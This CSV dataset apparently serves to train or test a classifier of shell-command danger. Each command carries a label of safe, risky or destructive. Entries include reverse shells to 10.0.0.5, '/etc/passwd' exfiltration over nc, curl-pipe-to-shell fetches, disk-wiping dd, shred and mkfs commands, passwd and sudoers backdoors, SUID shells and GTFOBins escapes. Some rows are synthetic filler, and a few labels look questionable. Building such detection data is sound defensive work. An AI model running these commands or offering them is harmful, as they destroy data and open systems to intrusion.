command,label,source
systemctl -v,safe,synthetic
echo 'working' && mkdir,safe,synthetic
sudo rm,destructive,synthetic
ls | grep -i ok,safe,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
rm -rf build,risky,synthetic
journalctl -f,safe,bash-history
rm -rf dist,risky,synthetic
echo 'working' && docker,safe,synthetic
shred -u /dev/sdb,destructive,synthetic
cargo run,safe,bash-history
chmod 4755 /tmp/x,risky,synthetic
chmod -R 777 /var/www,risky,synthetic
cat -v,safe,synthetic
sudo mkfs,destructive,synthetic
chmod -R 777 /var/www,risky,synthetic
head --help,safe,synthetic
sudo git,safe,synthetic
mkfs.ext4 /dev/sda,destructive,synthetic
chmod -R 777 .,risky,synthetic
sudo mkfs,destructive,synthetic
cp | grep -i ok,safe,synthetic
apt --help,safe,synthetic
mv ..,safe,synthetic
grep -v,safe,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
exit,safe,bash-history
echo 'working' && git,safe,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
cp -v,safe,synthetic
grep --help,safe,synthetic
shred -u /dev/mmcblk0,destructive,synthetic
echo 'working' && grep,safe,synthetic
mkdir -v,safe,synthetic
sudo cp,safe,synthetic
grep --help,safe,synthetic
git --help,safe,synthetic
systemctl stop bluetooth,safe,bash-history
nslookup google.com,safe,bash-history
apt -v,safe,synthetic
cat --help,safe,synthetic
sed -i 's/old/new/g' file.txt,safe,bash-history
python --version,safe,bash-history
rm -rf /dev/sda,destructive,mitre-attack
rm -rf node_modules/.cache,risky,synthetic
grep -r error /var/log,safe,bash-history
pip build/,safe,synthetic
echo 'working' && mkdir,safe,synthetic
mkfs -t ext4 /dev/sdb,destructive,mitre-attack
sudo head,safe,synthetic
more notes.txt,safe,bash-history
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
man rsync,safe,bash-history
grep | grep -i ok,safe,synthetic
ip route,safe,bash-history
sudo sysctl -w kernel.randomize_va_space=0,risky,mitre-attack
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
chmod -R 777 .,risky,synthetic
watch -n 2 'df -h',safe,bash-history
rm -f package-lock.json,risky,mitre-attack
ls /tmp,safe,synthetic
shred -n 3 /dev/sdb,destructive,synthetic
echo 'working' && apt,safe,synthetic
chmod 777 /tmp/data,risky,mitre-attack
docker /tmp,safe,synthetic
rm -rf .,destructive,mitre-attack
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 5555 > /tmp/f,risky,mitre-attack
echo 'working' && mkdir,safe,synthetic
docker run --privileged -it ubuntu bash,risky,mitre-attack
echo 'working' && ls,safe,synthetic
tar -xzf archive.tar.gz -C /tmp,safe,bash-history
init 0,risky,mitre-attack
echo 'working' && cat,safe,synthetic
awk '{print $1}' access.log,safe,bash-history
blkdiscard /dev/sda,destructive,mitre-attack
git ~/documents,safe,synthetic
pip list,safe,bash-history
mkdir /tmp/test,safe,bash-history
dd if=/dev/urandom of=/dev/nvme0n1 bs=512,destructive,synthetic
chmod 4755 /bin/busybox,risky,synthetic
shred -u /dev/mmcblk0,destructive,synthetic
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1,risky,mitre-attack
grep | grep -i ok,safe,synthetic
git rebase main,safe,bash-history
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
systemctl list-units,safe,bash-history
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
ls /tmp,safe,synthetic
sudo docker,safe,synthetic
docker system df,safe,bash-history
chmod 4777 /bin/busybox,risky,synthetic
cp | grep -i error,safe,synthetic
git -v,safe,synthetic
sudo mv,safe,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
sudo cp,safe,synthetic
mkfs.ext4 /dev/sda,destructive,mitre-attack
mkdir --help,safe,synthetic
mkdir --help,safe,synthetic
rm -rf /,destructive,mitre-attack
curl http://10.0.0.9/install.sh | bash,risky,synthetic
chmod 4755 /bin/busybox,risky,synthetic
df -h,safe,bash-history
cat ..,safe,synthetic
sudo systemctl,safe,synthetic
echo 'working' && git,safe,synthetic
cat -v,safe,synthetic
locate nginx.conf,safe,bash-history
mkdir | grep -i error,safe,synthetic
ls --help,safe,synthetic
curl -s http://pwn.example.com/x | sh,risky,mitre-attack
rm -rf dist,risky,synthetic
chmod -R 766 /var/www,risky,synthetic
dd if=/dev/urandom of=/dev/mmcblk0 bs=1M,destructive,synthetic
cat --help,safe,synthetic
docker -v,safe,synthetic
rm -rf /tmp/test/*,risky,synthetic
chmod -R 766 .,risky,synthetic
apt | grep -i warn,safe,synthetic
sudo mv,safe,synthetic
grep --help,safe,synthetic
sudo apt,safe,synthetic
vim -c ':!/bin/sh',risky,gtfobins
docker -v,safe,synthetic
mkfs.xfs /dev/nvme0n1,destructive,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
sleep 5 && echo done,safe,bash-history
cat -v,safe,synthetic
sudo wipefs,destructive,synthetic
ps aux | grep python,safe,bash-history
curl -I https://example.com,safe,bash-history
rm -rf build/,risky,mitre-attack
echo $HOME,safe,bash-history
sudo systemctl,safe,synthetic
mv | grep -i ok,safe,synthetic
chmod 4777 /tmp/x,risky,synthetic
rm -rf node_modules/.cache,risky,synthetic
pip --help,safe,synthetic
cat | grep -i fail,safe,synthetic
sudo systemctl start postgresql,safe,bash-history
mv | grep -i fail,safe,synthetic
rm -rf /*,destructive,mitre-attack
chmod u+s /tmp/x,risky,synthetic
docker src/,safe,synthetic
echo 'working' && cat,safe,synthetic
chmod 4777 /bin/bash,risky,synthetic
history,safe,bash-history
docker --help,safe,synthetic
rm -rf ./*,destructive,mitre-attack
pip | grep -i error,safe,synthetic
netstat -tulpn,safe,bash-history
sudo mv,safe,synthetic
chmod u+s /bin/busybox,risky,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
chmod u+s /bin/busybox,risky,synthetic
echo 'working' && mkdir,safe,synthetic
mkfs.btrfs /dev/nvme0n1,destructive,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
chmod -R 777 .,risky,synthetic
pip | grep -i error,safe,synthetic
sudo mv,safe,synthetic
sudo shred,destructive,synthetic
du -sh * | sort -rh | head -10,safe,bash-history
docker -v,safe,synthetic
shutdown -h now &,destructive,mitre-attack
less README.md,safe,bash-history
sudo pip,safe,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo 'working' && ls,safe,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
sudo docker,safe,synthetic
pip | grep -i ok,safe,synthetic
rm -rf __pycache__,risky,synthetic
pip | grep -i error,safe,synthetic
rm -rf /lib,destructive,mitre-attack
dd if=/dev/urandom of=/dev/mmcblk0 bs=512,destructive,synthetic
rm -rf ./node_modules,risky,mitre-attack
gcc -o hello hello.c,safe,bash-history
docker --help,safe,synthetic
traceroute 8.8.8.8,safe,bash-history
chmod 4755 /bin/bash,risky,synthetic
systemctl src/,safe,synthetic
chmod -R 777 /opt/app,risky,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
systemctl --help,safe,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
rm -rf /proc,destructive,mitre-attack
crontab -r,risky,mitre-attack
mkfs.vfat /dev/sda,destructive,synthetic
dd if=/dev/zero of=/dev/nvme0n1 bs=4M,destructive,synthetic
cp -v,safe,synthetic
rm -rf /boot,destructive,synthetic
sudo cp,safe,synthetic
docker -v,safe,synthetic
chmod -R 766 /var/www,risky,synthetic
time python script.py,safe,bash-history
rm -rf /bin,destructive,synthetic
rm -rf /etc,destructive,synthetic
ls --help,safe,synthetic
chmod -R 777 .,risky,synthetic
docker src/,safe,synthetic
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
git fetch origin,safe,bash-history
yes | head -10,safe,bash-history
rm -rf tmp/*,risky,synthetic
sudo cp,safe,synthetic
echo 'working' && mv,safe,synthetic
du -sh /home/user,safe,bash-history
mv --help,safe,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
sudo mkfs,destructive,synthetic
env,safe,bash-history
cp | grep -i error,safe,synthetic
ls | grep -i fail,safe,synthetic
find . -name '*.py',safe,bash-history
ls | grep -i warn,safe,synthetic
sudo rm,destructive,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
docker | grep -i fail,safe,synthetic
shred -n 3 /dev/mmcblk0,destructive,synthetic
dd if=/dev/zero of=/dev/nvme0n1 bs=1M,destructive,synthetic
rm -rf build,risky,synthetic
chmod -R 766 .,risky,synthetic
docker | grep -i warn,safe,synthetic
chmod 4755 /bin/bash,risky,synthetic
echo 'working' && systemctl,safe,synthetic
nc 10.0.0.5 5555 < /etc/passwd,risky,mitre-attack
dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive,synthetic
rm -fr /,destructive,mitre-attack
sudo cat,safe,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
echo 'working' && docker,safe,synthetic
find / -exec rm -rf {} +,destructive,mitre-attack
curl http://10.0.0.9/install.sh | bash,risky,synthetic
chmod -R 777 /tmp/data,risky,synthetic
head .,safe,synthetic
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
rm -rf /,destructive,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
head -v,safe,synthetic
chmod -R 766 /var/www,risky,synthetic
echo 'working' && pip,safe,synthetic
dd if=/dev/zero of=/dev/sda bs=4M,destructive,synthetic
sudo apt install htop,safe,bash-history
chmod -R 777 .,risky,synthetic
chmod -R 766 .,risky,synthetic
git | grep -i fail,safe,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
rm -rf /var,destructive,synthetic
echo hello world,safe,bash-history
ls /var/log,safe,synthetic
sudo docker,safe,synthetic
mkdir | grep -i error,safe,synthetic
dd if=/dev/urandom of=/dev/sda bs=4M,destructive,synthetic
cp -r assets dist/,safe,bash-history
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
rm -rf tmp/*,risky,synthetic
cp src/,safe,synthetic
sudo rm,destructive,synthetic
rm -rf /*,destructive,synthetic
echo 'working' && cp,safe,synthetic
dd if=/dev/zero of=/dev/mmcblk0 bs=4M,destructive,synthetic
mkfs.xfs /dev/nvme0n1,destructive,mitre-attack
ss -tulpn,safe,bash-history
systemctl --help,safe,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
sudo apt,safe,synthetic
pkill -9 -u root,risky,mitre-attack
mkdir data/,safe,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
apt --help,safe,synthetic
dd if=/dev/sda of=/dev/null bs=1M count=1,destructive,mitre-attack
dd if=/dev/urandom of=/dev/mmcblk0 bs=4M,destructive,synthetic
cat --help,safe,synthetic
head | grep -i ok,safe,synthetic
mkfs.xfs /dev/sda,destructive,synthetic
echo 'working' && mkdir,safe,synthetic
sudo ls,safe,synthetic
mkfs.vfat /dev/sda,destructive,synthetic
mv --help,safe,synthetic
sudo wipefs,destructive,synthetic
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,risky,mitre-attack
mkfs.ext4 /dev/sda,destructive,synthetic
dd if=/dev/zero of=/dev/sdb bs=4M,destructive,synthetic
head /tmp,safe,synthetic
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
pip --help,safe,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
printf 'name: %s\n' adhi,safe,bash-history
shred -u /dev/sda,destructive,synthetic
sudo rm -rf /lib/modules,destructive,mitre-attack
apt --help,safe,synthetic
sudo rm -rf /sbin,destructive,mitre-attack
head | grep -i ok,safe,synthetic
pip --help,safe,synthetic
shred -n 3 /dev/sdb,destructive,synthetic
rm -rf dist/*,risky,mitre-attack
mkfs.btrfs /dev/sda,destructive,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
head -v,safe,synthetic
dd if=/dev/zero of=/dev/sdb1,destructive,mitre-attack
git | grep -i error,safe,synthetic
echo 'working' && systemctl,safe,synthetic
sudo grep,safe,synthetic
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
echo 'working' && docker,safe,synthetic
npm start,safe,bash-history
echo 0 > /proc/sys/kernel/randomize_va_space,risky,mitre-attack
iptables -P INPUT ACCEPT,risky,mitre-attack
"eval ""$PAYLOAD""",risky,mitre-attack
curl http://example.com/install.sh | bash,risky,synthetic
docker | grep -i error,safe,synthetic
dd if=/dev/urandom of=/dev/nvme0n1 bs=1M,destructive,synthetic
sudo systemctl,safe,synthetic
pip -v,safe,synthetic
shred -vfz /dev/sda,destructive,mitre-attack
rm -rf __pycache__,risky,mitre-attack
cp --help,safe,synthetic
sudo mkdir,safe,synthetic
sudo head,safe,synthetic
cp ~/documents,safe,synthetic
npm run build,safe,bash-history
curl http://10.0.0.9/install.sh | bash,risky,synthetic
pip src/,safe,synthetic
curl -s https://api.example.com/status,safe,bash-history
date,safe,bash-history
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
mv src/,safe,synthetic
systemctl | grep -i warn,safe,synthetic
systemctl stop firewalld,risky,mitre-attack
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
sudo shred,destructive,synthetic
sudo su,risky,mitre-attack
echo root2:x:0:0 >> /etc/passwd,risky,synthetic
eval $(cat /tmp/script.txt),risky,mitre-attack
apt --help,safe,synthetic
echo 'working' && cp,safe,synthetic
docker --help,safe,synthetic
find / -name 'x' -exec /bin/sh \;,risky,gtfobins
zip -r backup.zip data/,safe,bash-history
rm -rf /*,destructive,synthetic
cat | grep -i fail,safe,synthetic
chmod -R 766 .,risky,synthetic
mkdir | grep -i warn,safe,synthetic
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash,risky,mitre-attack
curl http://example.com/install.sh | bash,risky,synthetic
docker | grep -i warn,safe,synthetic
apt -v,safe,synthetic
chmod 4777 /tmp/x,risky,synthetic
chmod -R 777 .,risky,mitre-attack
grep ..,safe,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
head data/,safe,synthetic
uptime,safe,bash-history
mkfs.btrfs /dev/sda,destructive,synthetic
kill -9 1,risky,mitre-attack
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
killall -9 java,risky,mitre-attack
grep | grep -i error,safe,synthetic
rm -rf /etc,destructive,synthetic
sudo rm -rf /etc/ssh,destructive,mitre-attack
shred -vfz /dev/sda,destructive,synthetic
shred -n 3 /dev/sda,destructive,synthetic
mkdir src/,safe,synthetic
chmod -R 777 /var/www,risky,synthetic
chmod -R 766 /opt/app,risky,synthetic
chmod 4755 /tmp/x,risky,synthetic
head | grep -i fail,safe,synthetic
git commit -m 'fix: bug',safe,bash-history
curl http://example.com/install.sh | bash,risky,synthetic
docker --help,safe,synthetic
chmod -R 777 /var/www,risky,synthetic
systemctl --help,safe,synthetic
sudo mkdir,safe,synthetic
cp | grep -i error,safe,synthetic
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
chmod -R 777 /opt/app,risky,synthetic
grep | grep -i warn,safe,synthetic
systemctl | grep -i warn,safe,synthetic
chmod u+s /tmp/x,risky,synthetic
export LD_PRELOAD=/home/user/evil.so,risky,synthetic
mv ~/documents,safe,synthetic
rm -rf /*,destructive,synthetic
echo 'working' && apt,safe,synthetic
echo 'working' && head,safe,synthetic
cd ~,safe,bash-history
pip -v,safe,synthetic
sudo dd,destructive,synthetic
docker | grep -i error,safe,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
systemctl -v,safe,synthetic
"perl -e 'exec ""/bin/sh"";'",risky,gtfobins
ls ..,safe,synthetic
sudo dd,destructive,synthetic
sudo grep,safe,synthetic
chmod -R 766 /opt/app,risky,synthetic
head /tmp,safe,synthetic
export LD_LIBRARY_PATH=/home/user/evil.so,risky,synthetic
ls -v,safe,synthetic
chmod 4777 /tmp/x,risky,synthetic
chmod u+s /tmp/x,risky,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
git -v,safe,synthetic
sudo mkfs,destructive,synthetic
echo 'working' && mkdir,safe,synthetic
shred -vfz /dev/mmcblk0,destructive,synthetic
grep build/,safe,synthetic
sudo rm -fr /home,destructive,mitre-attack
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
rm -rf /var,destructive,mitre-attack
grep --help,safe,synthetic
cat /etc/shadow,risky,mitre-attack
curl http://example.com/install.sh | bash,risky,synthetic
whoami,safe,bash-history
echo 'working' && systemctl,safe,synthetic
apt /tmp,safe,synthetic
systemctl --help,safe,synthetic
docker images,safe,bash-history
wipefs -af /dev/nvme0n1,destructive,mitre-attack
chmod u+s /bin/bash,risky,synthetic
echo admin:x:0:0 >> /etc/passwd,risky,synthetic
echo 'working' && cp,safe,synthetic
yes > /dev/null &,destructive,mitre-attack
pip -v,safe,synthetic
sudo git,safe,synthetic
blkid,safe,bash-history
export LD_LIBRARY_PATH=/tmp/lib.so,risky,synthetic
rm -rf /var,destructive,synthetic
rm -rf dist,risky,synthetic
dd if=/dev/zero of=/dev/sda bs=1M,destructive,synthetic
sudo mkdir,safe,synthetic
ip addr,safe,bash-history
curl http://example.com/install.sh | bash,risky,synthetic
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
mkfs.vfat /dev/nvme0n1,destructive,synthetic
ls -l /home/user,safe,bash-history
sudo wipefs,destructive,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
rm -rf *,destructive,mitre-attack
cp | grep -i fail,safe,synthetic
cp -v,safe,synthetic
ls | grep -i fail,safe,synthetic
export LD_PRELOAD=/tmp/lib.so,risky,mitre-attack
export LD_PRELOAD=/tmp/lib.so,risky,synthetic
make -j4,safe,bash-history
shred -u /dev/sdb,destructive,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
echo 'working' && cp,safe,synthetic
rm -rf /bin,destructive,synthetic
curl http://10.0.0.9/install.sh | bash,risky,synthetic
grep | grep -i warn,safe,synthetic
pip data/,safe,synthetic
docker exec -it container /bin/sh,risky,mitre-attack
cp | grep -i fail,safe,synthetic
apt | grep -i error,safe,synthetic
curl http://example.com/install.sh | bash,risky,synthetic
